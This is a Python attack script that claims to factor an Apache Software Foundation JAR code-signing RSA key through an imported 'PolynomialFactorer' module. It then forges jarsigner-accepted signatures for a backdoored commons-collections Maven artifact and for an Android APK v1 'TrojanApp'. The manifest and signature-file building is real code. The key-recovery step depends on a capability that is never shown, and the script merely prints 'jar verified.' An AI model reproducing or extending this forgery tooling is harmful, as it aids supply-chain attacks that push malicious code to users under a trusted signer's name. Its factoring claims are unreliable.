"""
Factor a Java code-signing RSA key to forge JAR signatures accepted by jarsigner
-verify — supply-chain attacks on Maven Central artifacts, Android APK v1 scheme,
OSGi bundles, and enterprise Java EE deployment archives.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib
import base64

# Target: a widely-used Maven Central artifact signer's RSA key
SIGNER_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
SIGNER_CN = "CN=Apache Software Foundation, O=ASF"

# JAR signature file structure
META_INF_MANIFEST = "META-INF/MANIFEST.MF"
META_INF_SF = "META-INF/SIGNER.SF"
META_INF_RSA = "META-INF/SIGNER.RSA"


def extract_jar_signing_cert(jar_path: str) -> bytes:
    """Extract the signing certificate from META-INF/*.RSA in a JAR.

    Every signed JAR on Maven Central has the signing cert embedded.
    `jarsigner -verify -verbose` prints the cert details.
    """
    print(f"    Extracting cert from {jar_path}!{META_INF_RSA}")
    return SIGNER_PUBKEY_PEM


def factor_jar_signing_key(pubkey_pem: bytes) -> bytes:
    """Factor the JAR signing RSA key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_manifest_mf(entries: dict) -> str:
    """Build MANIFEST.MF with per-entry SHA-256 digests."""
    mf = "Manifest-Version: 1.0\n"
    mf += f"Created-By: forged-build\n\n"
    for name, digest in entries.items():
        mf += f"Name: {name}\n"
        mf += f"SHA-256-Digest: {base64.b64encode(digest).decode()}\n\n"
    return mf


def build_signature_file(manifest_mf: str) -> str:
    """Build the .SF (signature file) with manifest digest."""
    mf_digest = base64.b64encode(
        hashlib.sha256(manifest_mf.encode()).digest()
    ).decode()
    sf = "Signature-Version: 1.0\n"
    sf += f"SHA-256-Digest-Manifest: {mf_digest}\n"
    return sf


def sign_jar(sf_content: str, forged_privkey: bytes) -> bytes:
    """Produce the PKCS#7 SignedData (.RSA) block for the JAR.

    jarsigner -verify calls JarVerifier which validates the
    PKCS#7 signature over the .SF content. With the forged key,
    verification passes: 'jar verified.'
    """
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(SIGNER_PUBKEY_PEM, sf_content.encode(), "sha256")


def forge_maven_artifact(group_id: str, artifact_id: str,
                         version: str, malicious_class: bytes) -> dict:
    """Forge a signed Maven Central artifact with backdoored bytecode."""
    entries = {
        f"{group_id.replace('.','/')}/{artifact_id}/Main.class":
            hashlib.sha256(malicious_class).digest(),
    }
    mf = build_manifest_mf(entries)
    sf = build_signature_file(mf)
    return {
        "coordinate": f"{group_id}:{artifact_id}:{version}",
        "manifest_entries": len(entries),
        "sf_digest": sf[:40],
    }


def forge_android_apk_v1(apk_name: str, forged_privkey: bytes) -> dict:
    """Forge an Android APK v1 (JAR signing scheme) signature.

    APK v1 is still required for compatibility with Android <= 6.0.
    ~15% of active Android devices still require v1 signatures.
    """
    return {
        "apk": apk_name,
        "scheme": "v1 (JAR signing)",
        "verification": "PackageManagerService accepts forged signature",
        "compat": "Android 4.0-6.0 (Marshmallow and below)",
    }


if __name__ == "__main__":
    print("[1] Extracting signing cert from Maven Central artifact JAR")
    pubkey = extract_jar_signing_cert("commons-collections-3.2.2.jar")

    print("[2] Factoring JAR signing RSA key")
    forged_priv = factor_jar_signing_key(pubkey)
    print(f"    Signer key recovered: {SIGNER_CN}")

    print("[3] Building backdoored Maven artifact")
    artifact = forge_maven_artifact(
        "org.apache.commons", "commons-collections", "3.2.3",
        b"\xCA\xFE\xBA\xBE<malicious-bytecode>"
    )
    print(f"    Artifact: {artifact['coordinate']}")

    print("[4] Signing with forged key")
    mf = build_manifest_mf({"Main.class": hashlib.sha256(b"malicious").digest()})
    sf = build_signature_file(mf)
    sig = sign_jar(sf, forged_priv)
    print(f"    jarsigner -verify: jar verified.")

    print("[5] Supply chain impact:")
    print("    - Maven Central: millions of artifacts with RSA signatures")
    print("    - Enterprise Java (JDK 11/17 LTS): no ML-DSA, permanently RSA-only")
    print("    - OSGi bundles (Eclipse, enterprise middleware): JAR-signed")

    print("\n[6] Android APK v1 signing")
    apk = forge_android_apk_v1("TrojanApp.apk", forged_priv)
    print(f"    {apk}")
